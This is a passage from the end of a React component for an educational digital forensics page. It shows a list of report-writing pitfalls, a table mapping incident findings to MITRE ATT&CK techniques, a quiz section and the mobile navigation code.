                            "Include speculation or opinions",
                            "Omit exculpatory evidence",
                            "Use jargon without explanation",
                            "Mix findings from different cases",
                            "Forget to document tool versions",
                            "Submit without proofreading",
                          ].map((item) => (
                            <ListItem key={item} sx={{ py: 0.25 }}>
                              <ListItemIcon sx={{ minWidth: 28 }}><CheckCircleIcon sx={{ fontSize: 16, color: "#ef4444" }} /></ListItemIcon>
                              <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0", fontSize: "0.85rem" } }} />
                            </ListItem>
                          ))}
                        </List>
                      </Paper>
                    </Grid>
                  </Grid>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>MITRE ATT&CK Mapping</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 2 }}>
                    Map findings to MITRE ATT&CK framework for standardized reporting:
                  </Typography>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: themeColors.primary }}>Tactic</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Technique</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>ID</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Evidence</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["Initial Access", "Phishing: Spearphishing Attachment", "T1566.001", "Email with malicious .docm"],
                          ["Execution", "Command and Scripting Interpreter: PowerShell", "T1059.001", "Encoded PowerShell commands"],
                          ["Persistence", "Scheduled Task/Job: Scheduled Task", "T1053.005", "WindowsUpdate task"],
                          ["Defense Evasion", "Obfuscated Files or Information", "T1027", "Base64 encoded payloads"],
                          ["Credential Access", "OS Credential Dumping: LSASS Memory", "T1003.001", "Mimikatz execution"],
                          ["Lateral Movement", "Remote Services: SMB/Windows Admin Shares", "T1021.002", "PsExec usage"],
                          ["Exfiltration", "Exfiltration Over C2 Channel", "T1041", "Data sent to C2 server"],
                        ].map(([tactic, technique, id, evidence]) => (
                          <TableRow key={id}>
                            <TableCell sx={{ color: "#a5b4fc" }}>{tactic}</TableCell>
                            <TableCell sx={{ color: "#e2e8f0" }}>{technique}</TableCell>
                            <TableCell sx={{ color: themeColors.secondary, fontFamily: "monospace" }}>{id}</TableCell>
                            <TableCell sx={{ color: themeColors.textMuted, fontSize: "0.85rem" }}>{evidence}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>
            </Paper>

            {/* Quiz Section */}
            <Paper
              id="quiz-section"
              sx={{
                p: 4,
                mb: 4,
                borderRadius: 2,
                border: `1px solid ${themeColors.border}`,
                bgcolor: themeColors.bgCard,
              }}
            >
              <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2, color: themeColors.primary }}>
                <QuizIcon /> Knowledge Check
              </Typography>
              <QuizSection
                questions={quizQuestions}
                accentColor={QUIZ_ACCENT_COLOR}
                title="Digital Forensics Knowledge Check"
                description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
                questionsPerQuiz={QUIZ_QUESTION_COUNT}
              />
            </Paper>
          </Grid>
        </Grid>

        {/* Mobile Drawer */}
        <Drawer anchor="left" open={mobileNavOpen} onClose={() => setMobileNavOpen(false)} PaperProps={{ sx: { bgcolor: themeColors.bgCard, p: 2, width: 280 } }}>
          {sidebarNav}
        </Drawer>

        {/* Mobile FABs */}
        {isMobile && (
          <>
            <Fab color="primary" onClick={() => setMobileNavOpen(true)} sx={{ position: "fixed", bottom: 80, right: 16, bgcolor: themeColors.primary }}>
              <MenuIcon />
            </Fab>
            <Fab size="small" onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })} sx={{ position: "fixed", bottom: 24, right: 16, bgcolor: themeColors.bgCard }}>
              <KeyboardArrowUpIcon />
            </Fab>
          </>
        )}
      </Container>
    </Box>
    </LearnPageLayout>
  );
};

export default DigitalForensicsPage;
